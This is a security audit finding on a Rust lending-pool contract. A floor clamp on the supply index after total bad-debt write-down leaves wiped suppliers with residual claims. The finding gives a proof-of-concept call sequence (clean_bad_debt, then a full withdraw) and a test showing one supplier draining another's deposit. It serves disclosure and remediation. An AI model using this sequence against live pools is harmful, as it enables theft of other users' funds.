### Residual supply-index floor lets wiped suppliers drain surviving pool cash - (File: contracts/pool/src/interest.rs)

### Summary
Bad-debt socialization reduces `supply_index`, but clamps it to `SUPPLY_INDEX_FLOOR_RAW` instead of zero when the write-down exceeds total supplied value. Because the corresponding supply shares remain recorded in `supplied`, wiped suppliers retain a residual claim that `withdraw` still converts into real tokens. If the pool retains unborrowed cash, an unprivileged supplier can call `clean_bad_debt` and immediately withdraw that residual claim ahead of other suppliers. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`clean_bad_debt` is permissionless after caller authorization and delegates to `execute_bad_debt_cleanup` once the account has debt and is insolvent with collateral at or below the dust cap. [4](#0-3) [5](#0-4) 

For each borrow leg, the pool converts the burned debt into `bad_debt`, passes it to `apply_bad_debt_to_supply_index`, and burns the debt shares. [6](#0-5) 

When `bad_debt >= total_supplied_value`, `remaining` becomes zero and the mathematically correct new index is zero. The implementation instead computes `new_supply_index.max(SUPPLY_INDEX_FLOOR_RAW)`, leaving a non-zero index while leaving `cache.supplied()` unchanged. [7](#0-6) 

A subsequent withdrawal resolves the old `scaled_amount` against this floored index, burns those shares, checks only tracked reserves and post-state guards, debits cash, and transfers the resolved amount to the owner-selected receiver. [8](#0-7) [3](#0-2) 

The pool test suite already demonstrates the exact accounting consequence: after a full write-down clamps the index to the floor, an old position has a positive stranded claim and can consume cash belonging to a later claim, leaving that claim unbacked. [9](#0-8) 

### Impact Explanation
This creates a race for residual claims after total bad-debt socialization. The first wiped supplier to call `withdraw` receives tokens that should no longer be represented by any valid supply claim, while equally wiped suppliers lose access to the same finite pool cash. If a recapitalizer or other legitimate cash inflow funds the market before the residual claims are removed, the same stranded claim can consume that cash as well. [10](#0-9) 

### Likelihood Explanation
The exploit requires a market to reach dust-gated bad debt where the debt write-down meets or exceeds total supplied value, and for the pool to retain or later receive cash. Both conditions arise from normal borrowing, interest accrual, liquidation, and permissionless cleanup flows rather than privileged state changes. The reachable sequence is `clean_bad_debt(caller, victim_account_id)` followed by `withdraw(caller, attacker_account_id, [(hub_asset, 0)], Some(attacker))`, with zero requesting the full position. [11](#0-10) [4](#0-3) 

### Recommendation
When a bad-debt write-down consumes the full supplied value, clear or otherwise invalidate all outstanding supply shares instead of clamping to a non-zero index. Alternatively, track a tombstoned market state and reject all residual withdrawals and recapitalization-funded claims until share state is explicitly reset. At minimum, withdrawal should reject a residual claim produced solely by the floor clamp rather than only checking available cash. [1](#0-0) [3](#0-2) 

### Proof of Concept
1. Attacker supplies to a market and receives `S_attacker` scaled supply.
2. A borrower accumulates debt that becomes insolvent while remaining collateral is at or below the dust threshold.
3. Attacker calls:
   ```rust
   controller.clean_bad_debt(attacker, victim_account_id);
   ```
   The pool computes `capped = min(bad_debt, total_supplied_value)`, reaches `remaining == 0`, and stores `SUPPLY_INDEX_FLOOR_RAW` instead of zero. [7](#0-6) 
4. Attacker calls:
   ```rust
   controller.withdraw(
       attacker,
       attacker_supply_account_id,
       vec![(hub_asset, 0)],
       Some(attacker),
   );
   ```
   The zero amount requests a full close; `resolve_withdrawal` converts `S_attacker` at the floored index into a positive gross amount, and `debit_cash` allows it while reserves contain enough cash. [8](#0-7) [3](#0-2) 
5. The pool’s test model confirms the result: the stranded position pays a non-zero amount, drains the available cash, and leaves another valid supplier’s claim uncovered. [12](#0-11)

pub(crate) fn apply_bad_debt_to_supply_index(cache: &mut Cache, bad_debt: Ray) {
    let total_supplied_value = cache.supplied().mul(cache.env(), cache.supply_index());

    if total_supplied_value == Ray::ZERO {
        return;
    }

    let capped = bad_debt.min(total_supplied_value);
    let remaining = total_supplied_value.checked_sub(cache.env(), capped);

    let reduction_factor = remaining.div_floor(cache.env(), total_supplied_value);
    let new_supply_index = cache
        .supply_index()
        .mul_floor(cache.env(), reduction_factor);

    cache.set_supply_index(new_supply_index.max(Ray::from(SUPPLY_INDEX_FLOOR_RAW)));
}

/// Authorizes permissionless dust-gated cleanup outside flash loans.
pub(crate) fn process_clean_bad_debt(env: &Env, caller: &Address, account_id: u64) {
    caller.require_auth();
    validation::require_not_flash_loaning(env);
    clean_bad_debt_standalone(env, account_id);
}

/// Admission condition for bad-debt socialization.
#[derive(Clone, Copy, PartialEq)]
enum BadDebtGate {
    /// Permissionless: insolvent *and* collateral at or below the dust threshold.
    DustCapped,
    /// Owner-only: insolvent alone, with no cap on the collateral left behind.
    InsolventOnly,
}

/// Requires open debt and the selected insolvency gate, then cleans up the account.
fn socialize_bad_debt(env: &Env, account_id: u64, gate: BadDebtGate) {
    let mut cache = Context::new(env);
    let account = storage::get_account(env, account_id);

    assert_with_error!(
        env,
        !account.borrow_positions.is_empty(),
        CollateralError::DebtPositionNotFound
    );

    let totals = risk::calculate_account_risk_totals(
        env,
        &mut cache,
        &account.supply_positions,
        &account.borrow_positions,
    );

    let admits = match gate {
        BadDebtGate::DustCapped => {
            is_socializable_bad_debt(totals.total_debt, totals.total_collateral)
        }
        BadDebtGate::InsolventOnly => totals.total_debt > totals.total_collateral,
    };
    assert_with_error!(env, admits, CollateralError::CannotCleanBadDebt);

    bad_debt::execute_bad_debt_cleanup(env, &mut cache, account_id, &account, &totals);
}

/// Socializes insolvent debt when remaining collateral is at or below the dust cap.
pub(crate) fn clean_bad_debt_standalone(env: &Env, account_id: u64) {
    socialize_bad_debt(env, account_id, BadDebtGate::DustCapped);

fn test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard() {
    let t = TestSetup::new();
    t.as_contract(|| {
        let scaled_a_raw = 1_000_000 * RAY;
        let mut cache = t.fresh_cache(PoolStateRaw {
            supplied: scaled_a_raw,
            borrowed: 0,
            revenue: 0,
            borrow_index: RAY,
            supply_index: RAY,
            last_timestamp: 0,
            cash: 0,
        });
        let scaled_a = Ray::from(scaled_a_raw);

        apply_bad_debt_to_supply_index(&mut cache, Ray::from(2_000_000 * RAY));
        assert_eq!(
            cache.supply_index().raw(),
            SUPPLY_INDEX_FLOOR_RAW,
            "wipeout must clamp supply index UP to the floor, not reset the base"
        );

        let stranded = cache.unscale_supply_floor(scaled_a);
        assert!(stranded > 0, "floor clamp leaves userA a phantom claim");
        assert_eq!(cache.cash(), 0, "empty market: no cash to extract yet");

        let c = stranded;
        let scaled_b = cache.calculate_scaled_supply(c);
        cache.mint_supply(scaled_b);
        cache.credit_cash(c);

        let b_claim = cache.unscale_supply_floor(scaled_b);
        assert_eq!(b_claim, c, "userB's honest claim equals their deposit");

        let (burn, gross) = cache.resolve_withdrawal(i128::MAX, scaled_a);
        cache.require_reserves(gross);
        cache.burn_supply(burn);
        cache.debit_cash(gross);

        assert!(gross > 0, "stranded position pays out non-zero");
        assert_eq!(
            gross, c,
            "userA drains exactly userB's fresh deposit out of the pool"
        );

        assert!(
            cache.cash() < b_claim,
            "pool cash ({}) can no longer cover userB's claim ({}): honest supplier lost funds",
            cache.cash(),
            b_claim
        );
        assert_eq!(cache.cash(), 0, "userA drained the pool to empty");
    });
